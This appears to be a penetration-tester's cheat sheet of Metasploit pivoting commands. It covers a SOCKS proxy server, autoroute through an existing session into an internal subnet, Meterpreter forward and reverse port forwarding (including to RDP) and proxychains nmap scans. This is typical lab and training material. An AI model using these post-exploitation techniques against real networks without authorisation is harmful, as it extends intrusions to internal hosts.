# SOCKS
```
use auxiliary/server/socks_proxy  
set SRVPORT 9050  
set SRVHOST 0.0.0.0  
set version 4a  
run  
  
jobs  
```

# Routes
```
use post/multi/manage/autoroute  
set SESSION 1  
set SUBNET 172.16.5.0  
run  
  
run autoroute -s 172.16.5.0/23  
run autoroute -p  
```
  

# Port Forwarding
## Forward

```
portfwd add -l 3300 -p 3389 -r 172.16.5.19  
```
  
## Reverse

```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18  
```
  
# Proxychains  

```
edit /etc/proxychains4.conf  
proxychains nmap target -p port -sT -v -Pn
```